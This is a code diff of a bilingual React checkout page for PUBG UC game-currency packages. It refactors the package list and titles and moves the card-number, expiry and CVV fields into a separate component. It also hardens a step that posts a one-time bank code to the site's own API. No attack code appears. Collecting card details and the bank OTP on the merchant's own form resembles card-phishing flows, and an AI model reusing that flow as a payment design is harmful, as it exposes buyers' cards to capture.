@@ -1,14 +1,6 @@
-import React, {useMemo, useState} from 'react';
-import {
-  Activity,
-  ArrowLeft,
-  ArrowRight,
-  Check,
-  CheckCircle2,
-  CreditCard,
-  ShieldAlert,
-  XCircle,
-} from 'lucide-react';
+import React, {useEffect, useMemo, useState} from 'react';
+import {Activity, ArrowLeft, ArrowRight, Check, ShieldAlert, XCircle} from 'lucide-react';
+import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
@@ -21,6 +13,11 @@ type PubgUcOrderProps = {
   userId: string | null;
   onBack: () => void;
   onComplete?: () => void;
+  titleAr?: string;
+  titleEn?: string;
+  subtitleAr?: string;
+  subtitleEn?: string;
+  packages?: PubgUcPackage[];
 };
 
 function UcIcon({tier}: {tier: PubgUcPackage['iconTier']}) {
@@ -113,9 +110,23 @@ function PackageCard({
   );
 }
 
-export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderProps) {
+export function PubgUcOrder({
+  clientId,
+  userId,
+  onBack,
+  onComplete,
+  titleAr,
+  titleEn,
+  subtitleAr,
+  subtitleEn,
+  packages,
+}: PubgUcOrderProps) {
   const {lang, t, dir} = useLanguage();
-  const [selectedId, setSelectedId] = useState(PUBG_UC_PACKAGES[0]?.id ?? '');
+  const packageList = useMemo(
+    () => (packages && packages.length > 0 ? packages : PUBG_UC_PACKAGES),
+    [packages],
+  );
+  const [selectedId, setSelectedId] = useState(packageList[0]?.id ?? '');
   const [playerId, setPlayerId] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showOtpStep, setShowOtpStep] = useState(false);
@@ -124,13 +135,15 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
 
   const selected = useMemo(
-    () => PUBG_UC_PACKAGES.find((p) => p.id === selectedId) ?? PUBG_UC_PACKAGES[0],
-    [selectedId],
+    () => packageList.find((p) => p.id === selectedId) ?? packageList[0],
+    [packageList, selectedId],
   );
 
-  const cardExpiryYearStart = new Date().getFullYear();
-  const cardExpiryYears = Array.from({length: 16}, (_, i) => cardExpiryYearStart + i);
-  const cardExpiryMonths = Array.from({length: 12}, (_, i) => String(i + 1).padStart(2, '0'));
+  useEffect(() => {
+    if (!packageList.find((p) => p.id === selectedId)) {
+      setSelectedId(packageList[0]?.id ?? '');
+    }
+  }, [packageList, selectedId]);
 
   const resetFlow = () => {
     setShowOtpStep(false);
@@ -195,13 +208,18 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!currentOrderId) return;
     setOtpState('checking');
     try {
-      await fetch(apiUrl('/api/transactions/otp'), {
+      const res = await fetch(apiUrl('/api/transactions/otp'), {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({order_id: currentOrderId, otpDigit: otpCode}),
+        body: JSON.stringify({order_id: currentOrderId, otpDigit: otpCode.trim()}),
       });
+      if (!res.ok) {
+        setOtpState('failed');
+        return;
+      }
       setOtpState('idle');
       resetFlow();
       onComplete?.();
@@ -224,8 +242,12 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
       </button>
 
       <div>
-        <h1 className="text-2xl font-black text-gray-900 sm:text-3xl">{t('pubgOrderTitle')}</h1>
-        <p className="mt-2 font-medium text-gray-500">{t('pubgOrderSubtitle')}</p>
+        <h1 className="text-2xl font-black text-gray-900 sm:text-3xl">
+          {lang === 'ar' ? titleAr || t('pubgOrderTitle') : titleEn || t('pubgOrderTitle')}
+        </h1>
+        <p className="mt-2 font-medium text-gray-500">
+          {lang === 'ar' ? subtitleAr || t('pubgOrderSubtitle') : subtitleEn || t('pubgOrderSubtitle')}
+        </p>
       </div>
 
       {showOtpStep ? (
@@ -278,7 +300,7 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
               {lang === 'ar' ? 'اضغط على الباقة المناسبة' : 'Tap a package to select'}
             </p>
             <div className="grid grid-cols-1 gap-2.5 min-[400px]:grid-cols-2 sm:gap-3">
-              {PUBG_UC_PACKAGES.map((pkg) => (
+              {packageList.map((pkg) => (
                 <div key={pkg.id} className="min-w-0">
                   <PackageCard
                     pkg={pkg}
@@ -308,99 +330,7 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
               />
             </div>
 
-            <div className="rounded-2xl border border-gray-200 bg-gray-50/80 p-4 sm:p-5">
-              <div className="mb-4 flex items-center gap-3 border-b border-gray-200 pb-4">
-                <div className="flex h-12 w-12 items-center justify-center rounded-2xl border border-gray-200 bg-white text-gray-700 shadow-sm">
-                  <CreditCard className="h-6 w-6" />
-                </div>
-                <div>
-                  <p className="text-xs font-bold uppercase tracking-wide text-gray-500">
-                    {t('pubgPaymentMethod')}
-                  </p>
-                  <p className="font-black text-gray-900">{t('creditCard')}</p>
-                </div>
-              </div>
-
-              <div className="space-y-4">
-                <div>
-                  <label className="mb-2 block text-sm font-bold text-gray-700">{t('cardHolderName')}</label>
-                  <input
-                    name="cc-name"
-                    type="text"
-                    required
-                    autoComplete="cc-name"
-                    dir="ltr"
-                    className="w-full rounded-xl border border-gray-200 bg-white px-4 py-3 font-medium text-gray-900"
-                  />
-                </div>
-                <div>
-                  <label className="mb-2 block text-sm font-bold text-gray-700">{t('cardNumber')}</label>
-                  <input
-                    name="cc-number"
-                    type="text"
-                    inputMode="numeric"
-                    required
-                    autoComplete="cc-number"
-                    dir="ltr"
-                    maxLength={19}
-                    className="w-full rounded-xl border border-gray-200 bg-white px-4 py-3 font-mono text-lg font-bold tracking-widest text-gray-900"
-                  />
-                </div>
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label className="mb-1.5 block text-xs font-bold text-gray-700">{t('monthShort')}</label>
-                    <select
-                      name="cc-exp-month"
-                      required
-                      defaultValue=""
-                      dir="ltr"
-                      className="w-full rounded-xl border border-gray-200 bg-white px-3 py-3 font-mono font-bold"
-                    >
-                      <option value="" disabled>
-                        MM
-                      </option>
-                      {cardExpiryMonths.map((m) => (
-                        <option key={m} value={m}>
-                          {m}
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-                  <div>
-                    <label className="mb-1.5 block text-xs font-bold text-gray-700">{t('yearShort')}</label>
-                    <select
-                      name="cc-exp-year"
-                      required
-                      defaultValue=""
-                      dir="ltr"
-                      className="w-full rounded-xl border border-gray-200 bg-white px-3 py-3 font-mono font-bold"
-                    >
-                      <option value="" disabled>
-                        YY
-                      </option>
-                      {cardExpiryYears.map((y) => (
-                        <option key={y} value={y}>
-                          {y}
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-                </div>
-                <div>
-                  <label className="mb-2 block text-sm font-bold text-gray-700">CVV</label>
-                  <input
-                    name="cc-csc"
-                    type="password"
-                    inputMode="numeric"
-                    required
-                    autoComplete="cc-csc"
-                    dir="ltr"
-                    maxLength={4}
-                    className="w-full max-w-[8rem] rounded-xl border border-gray-200 bg-white px-4 py-3 font-mono font-bold text-gray-900"
-                  />
-                </div>
-              </div>
-            </div>
+            <CreditCardPaymentFields idPrefix="pubg-cc" />
 
             <div className="flex items-center justify-between rounded-2xl border border-gray-200 bg-gray-50 px-4 py-4">
               <span className="font-bold text-gray-800">{t('totalPrice')}</span>
@@ -414,7 +344,7 @@ export function PubgUcOrder({clientId, userId, onBack, onComplete}: PubgUcOrderP
               disabled={isSubmitting || !playerId.trim()}
               className="w-full rounded-2xl bg-gray-900 py-4 font-black text-white shadow-lg disabled:opacity-60"
             >
-              {isSubmitting ? t('pubgProcessing') : t('submit')}
+              {isSubmitting ? t('pubgProcessing') : t('payNow')}
             </button>
           </form>
         </div>
